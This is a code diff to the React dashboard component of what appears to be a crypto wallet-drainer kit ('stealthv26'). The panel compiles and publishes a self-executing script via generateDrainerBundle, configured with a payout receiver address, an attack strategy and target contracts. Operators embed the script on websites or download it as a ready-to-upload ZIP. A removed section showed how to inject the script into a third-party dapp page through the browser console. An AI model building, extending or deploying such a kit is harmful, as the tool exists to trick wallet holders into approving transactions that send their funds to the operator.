@@ -7,13 +7,14 @@ import { Badge } from "@/components/ui/badge";
 import { Label } from "@/components/ui/label";
 import { ScrollArea } from "@/components/ui/scroll-area";
 import { Separator } from "@/components/ui/separator";
-import { Download, Copy, Check, Play, FileCode2, Shield, Zap, ExternalLink, Rocket, TestTube } from "lucide-react";
+import { Archive, Download, Copy, Check, Play, FileCode2, Shield, Zap, ExternalLink } from "lucide-react";
 import { useEffect, useState } from "react";
 import { toast } from "sonner";
 import Link from "next/link";
 import { getEcosystemLabel } from "@/lib/ecosystems";
 import { getContractById } from "@/lib/contract-registry";
 import { generateDrainerBundle } from "@/lib/universal-sdk-generator";
+import { createInlineScript, createWebsiteZip } from "@/lib/script-artifacts";
 
 const FRAMEWORK_LABELS = {
   reown: "Reown",
@@ -26,11 +27,11 @@ const FRAMEWORK_LABELS = {
 
 function getFrameworkDescription(framework: keyof typeof FRAMEWORK_LABELS) {
   if (framework === "rainbowkit") {
-    return "Compile guidance is tailored for a React page using wagmi + RainbowKit. The generated SDK stays available as a fallback helper layer.";
+    return "Compile guidance is tailored for a React page using wagmi + RainbowKit. The generated JavaScript runs as a standalone page script.";
   }
 
   if (framework === "custom") {
-    return "Compile output keeps the SDK hooks and lets you trigger the wallet popup from your own UI.";
+    return "The standalone script binds your own UI trigger and opens the wallet popup without exporting an SDK API.";
   }
 
   return "Generate a plug-and-play JavaScript module with popup-based wallet connection and a compact connect button that can be appended to any page.";
@@ -83,7 +84,7 @@ export function Providers({ children }) {
 
   if (framework === "custom") {
     return `<!-- Add before </body> -->
-<script type="module" src="stealthv26.min.js"></script>
+<script src="script.js"></script>
 
 <!-- Your own connect trigger -->
 <button class="${connectClass.replace(".", "")}">${connectText}</button>
@@ -96,7 +97,7 @@ export function Providers({ children }) {
   }
 
   return `<!-- Add before </body> -->
-<script type="module" src="stealthv26.min.js"></script>
+<script src="script.js"></script>
 
 <!-- Option 1: Auto-injected ${FRAMEWORK_LABELS[framework]} button -->
 <div data-sv26-button></div>
@@ -108,40 +109,17 @@ export function Providers({ children }) {
 <appkit-button balance="show"></appkit-button>`;
 }
 
-function getCreateWCDappTestingSnippet(scriptUrl: string, connectClass: string, connectText: string) {
-  return `1. Visit: https://create-wc-dapp.vercel.app/
-
-2. Open browser DevTools (F12) → Console tab
-
-3. Paste this code:
-${`const script = document.createElement('script');
-script.type = 'module';
-script.src = '${scriptUrl}';
-document.body.appendChild(script);
-
-// Wait 2 seconds for script to load
-setTimeout(() => {
-  console.log('✓ Wallet script loaded!');
-  console.log('Click the Connect button on the page to test');
-}, 2000);`}
-
-4. The wallet connect button on create-wc-dapp should now work with your configuration
-
-5. Your compiled script will route transactions to:
-    Receiver: ${connectClass}`;
-}
-
 function getEmbedCodeSnippet(scriptUrl: string, framework: keyof typeof FRAMEWORK_LABELS, connectClass: string, connectText: string) {
   if (framework === "rainbowkit") {
     return `// Published bundle URL
 // ${scriptUrl}
 
 // RainbowKit mode still expects a React provider setup.
-// Use the generated provider snippet above and keep the published script as your hosted SDK artifact.`;
+// Use the generated provider snippet above and load the published standalone script.`;
   }
 
-  return `<!-- One module script: loads Reown AppKit from CDN, opens wallet modal, binds buttons -->
-<script type="module" src="${scriptUrl}"></script>
+  return `<!-- One standalone script: opens the wallet modal and binds buttons -->
+<script src="${scriptUrl}"></script>
 
 <div data-sv26-button></div>
 
@@ -151,7 +129,7 @@ function getEmbedCodeSnippet(scriptUrl: string, framework: keyof typeof FRAMEWOR
 
 const getPublishedIntegrationSnippet = getEmbedCodeSnippet;
 
-function downloadFile(filename: string, content: string, type = "text/plain") {
+function downloadFile(filename: string, content: BlobPart, type = "text/plain") {
   const blob = new Blob([content], { type });
   const url = URL.createObjectURL(blob);
   const a = document.createElement("a");
@@ -163,6 +141,11 @@ function downloadFile(filename: string, content: string, type = "text/plain") {
   URL.revokeObjectURL(url);
 }
 
+function getSelectedContractId(general: object): string {
+  const contractId = (general as { contractId?: unknown }).contractId;
+  return typeof contractId === "string" && contractId ? contractId : "stage1-module";
+}
+
 export function CompileOutput() {
   const {
     generalConfig,
@@ -171,26 +154,33 @@ export function CompileOutput() {
     tokensConfig,
     advancedConfig,
     payoutConfig,
+    contractsConfig,
+    strategyConfig,
   } = useStore();
   const [compiled, setCompiled] = useState(false);
   const [copied, setCopied] = useState(false);
-  const [sdkOutput, setSdkOutput] = useState("");
+  const [scriptOutput, setScriptOutput] = useState("");
   const [publishedUrl, setPublishedUrl] = useState<string | null>(null);
   const [compileBusy, setCompileBusy] = useState(false);
   const [compileError, setCompileError] = useState<string | null>(null);
   const [origin, setOrigin] = useState("");
-  const [cdnCopied, setCdnCopied] = useState<string | null>(null);
   const frameworkLabel = FRAMEWORK_LABELS[modalConfig.modalFrameworkStyle];
   const ecosystemLabel = getEcosystemLabel(generalConfig.ecosystem);
   const ecosystemDetails = getEcosystemDetails(generalConfig);
   const frameworkDescription = getFrameworkDescription(modalConfig.modalFrameworkStyle);
+  const selectedContract = getContractById(getSelectedContractId(generalConfig));
+  const selectedStrategy = selectedContract?.strategySupport?.includes(strategyConfig.mode)
+    ? strategyConfig
+    : { ...strategyConfig, mode: selectedContract?.strategySupport?.[0] || strategyConfig.mode };
   const quickIntegrationSnippet = getQuickIntegrationSnippet(
     modalConfig.modalFrameworkStyle,
     generalConfig.connectButtonClass,
     generalConfig.connectText,
   );
   const absolutePublishedUrl =
-    publishedUrl && origin
+    publishedUrl && /^https?:\/\//i.test(publishedUrl)
+      ? publishedUrl
+      : publishedUrl && origin
       ? `${origin}${publishedUrl.startsWith("/") ? publishedUrl : `/${publishedUrl}`}`
       : publishedUrl;
 
@@ -203,9 +193,6 @@ export function CompileOutput() {
       )
     : null;
 
-  const liveSdkUrl = origin ? `${origin}/api/sdk` : "/api/sdk";
-  const latestStaticUrl = origin ? `${origin}/generated-scripts/stealthv26-latest.min.js` : "/generated-scripts/stealthv26-latest.min.js";
-
   useEffect(() => {
     const base =
       (process.env.NEXT_PUBLIC_APP_URL || "").replace(/\/$/, "") ||
@@ -213,19 +200,12 @@ export function CompileOutput() {
     setOrigin(base);
   }, []);
 
-  const copyCdn = async (label: string, text: string) => {
-    await navigator.clipboard.writeText(text);
-    setCdnCopied(label);
-    toast.success(`${label} copied`);
-    setTimeout(() => setCdnCopied(null), 2000);
-  };
-
   const handleCompile = async () => {
     setCompileBusy(true);
     setCompileError(null);
 
     try {
-      const selectedContractId = (generalConfig as any).contractId || "stage1-module";
+      const selectedContractId = getSelectedContractId(generalConfig);
       const contractMeta = getContractById(selectedContractId);
 
       let result;
@@ -266,7 +246,9 @@ export function CompileOutput() {
             tokens: tokensConfig,
             advanced: advancedConfig,
             payout: payoutConfig,
-            contractId: (generalConfig as any).contractId || "stage1-module",
+            contracts: contractsConfig,
+            strategy: selectedStrategy,
+            contractId: getSelectedContractId(generalConfig),
             receiverAddress: payoutConfig.address || "0x0000000000000000000000000000000000000000",
             saveConfig: true,
             saveBuild: true,
@@ -288,11 +270,11 @@ export function CompileOutput() {
         };
       }
 
-      setSdkOutput(result.bundle || "");
+      setScriptOutput(result.bundle || "");
       setPublishedUrl(result.publishedUrl || null);
       setCompiled(true);
       setCompileError(null);
-      toast.success("SDK compiled and published");
+      toast.success("Standalone script compiled and published");
 
     } catch (error) {
       const msg = error instanceof Error ? error.message : "Compilation failed";
@@ -305,15 +287,21 @@ export function CompileOutput() {
   };
 
   const handleCopy = () => {
-    navigator.clipboard.writeText(sdkOutput);
+    navigator.clipboard.writeText(createInlineScript(scriptOutput));
     setCopied(true);
     setTimeout(() => setCopied(false), 2000);
-    toast.success("Copied to clipboard");
+    toast.success("Inline script copied");
   };
 
   const handleDownload = () => {
-    downloadFile("stealthv26.min.js", sdkOutput, "application/javascript");
-    toast.success("Downloaded stealthv26.min.js");
+    downloadFile("script.js", scriptOutput, "application/javascript");
+    toast.success("Downloaded script.js");
+  };
+
+  const handleDownloadZip = () => {
+    const bytes = createWebsiteZip(scriptOutput);
+    downloadFile("website-script.zip", new Blob([bytes.buffer as ArrayBuffer], { type: "application/zip" }), "application/zip");
+    toast.success("Downloaded website-script.zip");
   };
 
   return (
@@ -377,67 +365,15 @@ export function CompileOutput() {
 
       <Card>
         <CardHeader>
-          <CardTitle className="text-base">Script / CDN → wallet modal</CardTitle>
+          <CardTitle className="text-base">Standalone website script</CardTitle>
           <CardDescription>
-            One <code className="text-primary">&lt;script type=&quot;module&quot;&gt;</code> on your page. The bundle pulls Reown AppKit from jsDelivr and opens the connect modal; you do not add a separate AppKit script tag.
+            One self-executing <code className="text-primary">script.js</code> for your page. It runs directly and does not expose an SDK interface.
           </CardDescription>
         </CardHeader>
         <CardContent className="space-y-4">
           <p className="text-[11px] text-muted-foreground">
-            {origin
-              ? "URLs use this site’s origin. Set NEXT_PUBLIC_APP_URL if the public hostname differs (e.g. behind a proxy)."
-              : "Relative paths work on this domain only; open the dashboard on your public URL or set NEXT_PUBLIC_APP_URL for copy-paste to external sites."}{" "}
-            Affiliate <code className="text-primary">/api/script?configId=…</code> is optional — use{" "}
-            <Link href="/sdk-self-test" className="text-primary underline-offset-2 hover:underline">
-              SDK Self-Test
-            </Link>{" "}
-            to try <code className="text-primary">/api/sdk</code> in-app without an affiliate id.
+            Compile once, then copy the inline code, download <code className="text-primary">script.js</code>, or download a ready-to-upload ZIP. The published URL appears with the compiled result.
           </p>
-
-          <div className="rounded-lg border bg-accent/30 p-4 space-y-2">
-            <div className="flex items-center justify-between gap-2">
-              <p className="text-xs font-medium">Live dashboard bundle (recommended)</p>
-              <Button
-                type="button"
-                variant="outline"
-                size="sm"
-                className="text-[10px] shrink-0"
-                onClick={() => void copyCdn("Live /api/sdk", `<script type="module" src="${liveSdkUrl}"></script>\n\n<div data-sv26-button></div>`)}
-              >
-                {cdnCopied === "Live /api/sdk" ? <Check className="h-3 w-3" /> : <Copy className="h-3 w-3" />}
-              </Button>
-            </div>
-            <p className="text-[11px] text-muted-foreground">
-              Always matches Compile + Contract + Settings on this server (no re-upload after you change config).
-            </p>
-            <pre className="bg-zinc-950 text-emerald-400 rounded-lg p-3 text-xs font-mono whitespace-pre-wrap">{`<script type="module" src="${liveSdkUrl}"></script>
-
-<div data-sv26-button></div>`}</pre>
-          </div>
-
-          <div className="rounded-lg border bg-accent/30 p-4 space-y-2">
-            <div className="flex items-center justify-between gap-2">
-              <p className="text-xs font-medium">Last compiled file (static)</p>
-              <Button
-                type="button"
-                variant="outline"
-                size="sm"
-                className="text-[10px] shrink-0"
-                onClick={() =>
-                  void copyCdn(
-                    "Latest static",
-                    `<script type="module" src="${latestStaticUrl}"></script>\n\n<div data-sv26-button></div>`,
-                  )
-                }
-              >
-                {cdnCopied === "Latest static" ? <Check className="h-3 w-3" /> : <Copy className="h-3 w-3" />}
-              </Button>
-            </div>
-            <p className="text-[11px] text-muted-foreground">Updated each time you click Compile SDK (good for CDNs and cache headers).</p>
-            <pre className="bg-zinc-950 text-emerald-400 rounded-lg p-3 text-xs font-mono whitespace-pre-wrap">{`<script type="module" src="${latestStaticUrl}"></script>
-
-<div data-sv26-button></div>`}</pre>
-          </div>
         </CardContent>
       </Card>
 
@@ -447,7 +383,7 @@ export function CompileOutput() {
           <div className="flex items-center justify-between">
             <div className="flex items-center gap-2">
               <FileCode2 className="h-4 w-4 text-primary" />
-              <CardTitle className="text-base">SDK Compiler</CardTitle>
+              <CardTitle className="text-base">Standalone JavaScript Compiler</CardTitle>
             </div>
             <div className="flex items-center gap-2">
               <Badge variant="outline" className="text-[10px]">
@@ -461,7 +397,7 @@ export function CompileOutput() {
             </div>
           </div>
           <CardDescription>
-            {frameworkDescription} Add <code className="text-primary">&lt;script type=&quot;module&quot; src=&quot;stealthv26.min.js&quot;&gt;</code> to any website and target elements with class <code className="text-primary">{generalConfig.connectButtonClass}</code>.
+            {frameworkDescription} Add <code className="text-primary">&lt;script src=&quot;script.js&quot;&gt;&lt;/script&gt;</code> to any website and target elements with class <code className="text-primary">{generalConfig.connectButtonClass}</code>.
             {modalConfig.walletConnectProjectId ? (
               <span className="block mt-1 text-emerald-500">{frameworkLabel} Project ID: {modalConfig.walletConnectProjectId}</span>
             ) : (
@@ -484,18 +420,22 @@ export function CompileOutput() {
           <div className="flex flex-wrap gap-3">
             <Button onClick={() => void handleCompile()} className="gap-2" disabled={compileBusy}>
               <Play className="h-4 w-4" />
-              {compileBusy ? "Compiling..." : compiled ? "Recompile SDK" : "Compile SDK"}
+              {compileBusy ? "Compiling..." : compiled ? "Recompile Script" : "Compile Script"}
             </Button>
 
             {compiled && (
               <>
                 <Button variant="outline" onClick={handleCopy} className="gap-2">
                   {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
-                  {copied ? "Copied!" : "Copy to Clipboard"}
+                  {copied ? "Copied!" : "Copy Inline JavaScript"}
                 </Button>
                 <Button variant="outline" onClick={handleDownload} className="gap-2">
                   <Download className="h-4 w-4" />
-                  Download .js
+                  Download script.js
+                </Button>
+                <Button variant="outline" onClick={handleDownloadZip} className="gap-2">
+                  <Archive className="h-4 w-4" />
+                  Download Website ZIP
                 </Button>
                 <Link href="/templates">
                   <Button variant="outline" className="gap-2">
@@ -507,54 +447,8 @@ export function CompileOutput() {
             )}
           </div>
 
-          {compiled && sdkOutput && (
+          {compiled && scriptOutput && (
             <>
-              <Separator />
-
-              <div className="rounded-lg border bg-blue-950/30 p-4 space-y-2 border-blue-500/30">
-                <div className="flex items-center gap-2 mb-2">
-                  <TestTube className="h-4 w-4 text-blue-400" />
-                  <p className="text-xs font-medium text-blue-300">Test on create-wc-dapp.vercel.app</p>
-                </div>
-                <p className="text-[11px] text-muted-foreground">
-                  Test your compiled script with the WalletConnect button on the official dapp creator:
-                </p>
-                <div className="flex gap-2 flex-wrap">
-                  <a href="https://create-wc-dapp.vercel.app/" target="_blank" rel="noopener noreferrer">
-                    <Button variant="outline" size="sm" className="gap-2 text-[10px]">
-                      <Rocket className="h-3 w-3" />
-                      Open create-wc-dapp
-                      <ExternalLink className="h-3 w-3" />
-                    </Button>
-                  </a>
-                  <Button
-                    variant="outline"
-                    size="sm"
-                    className="text-[10px]"
-                    onClick={() => {
-                      const testCode = `const script = document.createElement('script');
-script.type = 'module';
-script.src = '${absolutePublishedUrl || latestStaticUrl}';
-document.body.appendChild(script);
-setTimeout(() => console.log('✓ Script loaded - click Connect Wallet button'), 2000);`;
-                      navigator.clipboard.writeText(testCode);
-                      toast.success("Test code copied to clipboard");
-                    }}
-                  >
-                    {cdnCopied === "create-wc-dapp-test" ? <Check className="h-3 w-3" /> : <Copy className="h-3 w-3" />}
-                    Copy Test Code
-                  </Button>
-                </div>
-                <pre className="bg-zinc-950 text-blue-300 rounded-lg p-3 text-xs font-mono whitespace-pre-wrap text-[10px] leading-relaxed">{`Open DevTools (F12) → Console, paste:
-
-const script = document.createElement('script');
-script.type = 'module';
-script.src = '${absolutePublishedUrl || latestStaticUrl}';
-document.body.appendChild(script);
-
-// Click the Connect Wallet button to test`}</pre>
-              </div>
-
               <Separator />
 
               <div className="rounded-lg border bg-accent/30 p-4 space-y-2">
@@ -587,13 +481,13 @@ document.body.appendChild(script);
               <div className="space-y-2">
                 <div className="flex items-center justify-between">
                   <p className="text-xs text-muted-foreground">
-                    stealthv26.min.js — {(sdkOutput.length / 1024).toFixed(1)}KB • {ecosystemLabel} + {frameworkLabel} runtime
+                    script.js — {(scriptOutput.length / 1024).toFixed(1)}KB • {ecosystemLabel} + {frameworkLabel} runtime
                   </p>
                   <Badge variant="secondary" className="text-[10px]">Compiled</Badge>
                 </div>
                 <ScrollArea className="h-[500px] w-full rounded-lg border bg-zinc-950 p-4">
                   <pre className="text-xs text-emerald-400 font-mono whitespace-pre-wrap leading-relaxed">
-                    {sdkOutput}
+                    {scriptOutput}
                   </pre>
                 </ScrollArea>
               </div>
